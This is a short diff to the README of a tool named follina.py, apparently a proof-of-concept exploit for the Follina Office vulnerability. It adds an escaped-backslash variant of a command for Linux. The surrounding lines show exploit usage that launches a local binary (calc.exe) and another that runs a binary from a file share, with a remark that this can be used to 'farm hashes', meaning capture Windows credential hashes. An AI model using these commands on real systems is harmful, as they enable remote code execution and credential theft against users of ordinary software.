@@ -36,6 +36,9 @@ Optional Arguments:
 # Execute a local binary
 python .\follina.py -m binary -b \windows\system32\calc.exe
 
+# On linux you may have to escape backslashes
+python .\follina.py -m binary -b \\windows\\system32\\calc.exe
+
 # Execute a binary from a file share (can be used to farm hashes 👀)
 python .\follina.py -m binary -b \\localhost\c$\windows\system32\calc.exe
 
